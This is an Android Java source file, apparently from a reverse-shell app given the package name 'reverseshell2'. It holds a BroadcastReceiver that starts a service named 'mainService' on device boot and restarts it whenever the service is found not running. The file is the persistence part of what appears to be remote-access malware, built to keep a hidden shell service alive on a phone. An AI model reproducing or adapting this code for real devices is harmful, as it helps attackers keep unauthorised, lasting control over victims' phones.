package com.example.reverseshell2;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Received...");
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            // On boot, schedule job or restart service
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                new functions(null).jobScheduler(context);
            } else {
                context.startService(new Intent(context, mainService.class));
            }
        } else {
            if(isMyServiceRunning(context)) {
                Log.v(TAG, "Yeah, it's running, no need to restart service");
            } else {
                Log.v(TAG, "Not running, restarting service");
                Intent intent1 = new Intent(context, mainService.class);
                context.startService(intent1);
            }
        }
    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (mainService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
